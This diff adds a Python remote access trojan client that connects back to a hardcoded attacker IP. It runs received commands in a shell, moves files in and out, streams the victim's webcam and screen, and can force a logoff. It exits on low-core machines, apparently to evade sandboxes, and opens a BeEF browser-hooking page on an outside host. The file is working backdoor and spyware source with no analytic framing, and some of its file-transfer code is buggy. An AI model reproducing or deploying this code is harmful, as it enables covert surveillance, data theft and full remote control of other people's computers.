@@ -1,0 +1,250 @@
+from json import load
+import socket
+import json
+import subprocess
+import cv2
+import time
+import pyautogui
+import os
+import numpy as np
+import time
+import ctypes
+import threading
+
+port = 9999
+ip = '192.168.56.1'
+
+
+
+def download_file(file_name):
+    f = open(file_name,"wb")
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+        s.settimeout(None)
+        f.close()   
+
+
+def upload_file(file_name):
+    f = open(file_name,"rb")
+    s.send(f.read())
+
+def screenshot():    
+    image = pyautogui.screenshot()
+    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+    cv2.imwrite("screenshot.png", image)
+
+def connection():
+    while True:
+        time.sleep(5)
+        try:
+            s.connect((ip, port))
+            shell()
+            s.close()
+        except:
+            connection()
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+
+def reliable_recv():
+    data = ""
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def reverse_shell():
+    # Check if the system has sufficient CPU resources (more than 2 cores)
+    if os.cpu_count() <= 2:
+        print("[!] Insufficient CPU resources, exiting.")
+        quit()
+
+    # Set up the attacker's IP address and the port for the reverse shell connection
+    HOST = '192.168.56.1'  # Replace with your attacker's IP
+    PORT = 4444  # Port for reverse shell connection
+
+    # Create a socket and try to connect to the attacker's machine
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((HOST, PORT))
+        s.send(str.encode("[*] Connection Established!"))
+    except Exception as e:
+        print(f"[!] Failed to connect to server: {e}")
+        return
+
+    # Main loop to listen for commands from the attacker
+    while True:
+        try:
+            # Send the current working directory to the attacker
+            s.send(str.encode(os.getcwd() + "> "))
+            
+            # Receive command from the attacker and decode it
+            data = s.recv(1024).decode("UTF-8", errors='ignore').strip()
+
+            if data == "quit":
+                break
+            elif data[:2] == "cd":
+                try:
+                    # Try to change the directory and send a success message
+                    os.chdir(data[3:])
+                    s.send(str.encode("[*] Directory changed successfully\n"))
+                except FileNotFoundError as e:
+                    s.send(str.encode(f"[!] Error: {str(e)}\n"))
+            else:
+                try:
+                    # Execute the command and capture both stdout and stderr
+                    proc = subprocess.Popen(
+                        data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+                    )
+                    stdout_value, stderr_value = proc.communicate()
+
+                    # Combine the output and send it back to the attacker
+                    output_str = str(stdout_value + stderr_value, "UTF-8", errors='ignore')
+                    if not output_str:
+                        output_str = "[*] No output from command."
+                    s.send(output_str.encode("UTF-8"))
+                except Exception as e:
+                    s.send(str.encode(f"[!] Error executing command: {str(e)}\n"))
+        except Exception as e:
+            print(f"[!] Error in communication: {e}")
+            continue
+
+    # Close the socket when the loop is finished
+    s.close()
+
+def send_frame(s, frame):
+    try:
+        # Encode frame to JPEG format
+        _, img_encoded = cv2.imencode('.jpg', frame)
+        img_bytes = img_encoded.tobytes()
+
+        # Send frame size followed by frame data
+        s.sendall(len(img_bytes).to_bytes(4, 'big'))  # Frame size
+        s.sendall(img_bytes)  # Frame bytes
+        return True
+    except Exception as e:
+        print(f"[!] Error sending frame: {e}")
+        return False
+
+def camera_reverse_shell():
+    HOST = '192.168.56.1'  # Your machine's IP
+    PORT = 5555  # Port for reverse shell connection
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((HOST, PORT))
+    except Exception as e:
+        print(f"[!] Failed to connect to server for camera stream: {e}")
+        return
+
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        s.sendall(b"[!] Failed to access camera")
+        return
+
+    try:
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                print("[!] Failed to capture frame, stopping...")
+                break
+            # Send the frame
+            if not send_frame(s, frame):
+                print("[!] Frame sending failed, stopping stream.")
+                break
+            time.sleep(0.05)  # Add delay to manage frame rate
+    finally:
+        cap.release()
+        s.close()
+
+def send_screenshot(s, frame):
+    try:
+        # Encode frame to JPEG format
+        _, img_encoded = cv2.imencode('.jpg', frame)
+        img_bytes = img_encoded.tobytes()
+
+        # Send frame size followed by frame data
+        s.sendall(len(img_bytes).to_bytes(4, 'big'))  # Frame size
+        s.sendall(img_bytes)  # Frame bytes
+        return True
+    except Exception as e:
+        print(f"[!] Error sending frame: {e}")
+        return False
+
+def screenshot_reverse_shell():
+    HOST = '192.168.56.1'  # Your machine's IP
+    PORT = 5555  # Port for reverse shell connection
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((HOST, PORT))
+    except Exception as e:
+        print(f"[!] Failed to connect to server for screenshot: {e}")
+        return
+
+    try:
+        while True:
+            # Capture a screenshot of the screen
+            screenshot = pyautogui.screenshot()
+
+            # Convert screenshot to a format that OpenCV can handle (numpy array)
+            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
+
+            # Send the screenshot frame just like the camera frame
+            if not send_screenshot(s, frame):
+                print("[!] Frame sending failed, stopping screenshot capture.")
+                break
+
+            time.sleep(2)  # Adjust the delay to suit your needs (2 seconds here)
+    finally:
+        s.close()
+
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == "quit":
+            break
+        elif command =="camera":
+            threading.Thread(target=camera_reverse_shell, daemon=True).start()
+        elif command =="beef server":
+            cmd = "start https://172-105-251-108.ip.linodeusercontent.com:3000/demos/butcher/index.html"
+            pl = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            pl.wait()
+        elif command == "vypnut":
+            ctypes.windll.user32.MessageBoxW(0, "The system will log off in 1 minute.", "Shutdown Warning", 1)
+            time.sleep(5)
+            os.system('shutdown /l')
+        elif command == "screenshot":
+            threading.Thread(target=screenshot_reverse_shell, daemon=True).start()
+        elif command == "shell":
+            threading.Thread(target=reverse_shell, daemon=True).start()
+        elif command =='help':
+            pass
+        elif command =="clear":
+            pass
+        elif command[:6] == "upload":
+            download_file(command[:7])
+        elif command =="screen":
+            screenshot()
+            upload_file('screenshot.png')
+            #os.remove('screen.png')
+        else:
+            execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE )
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,port))
+shell()
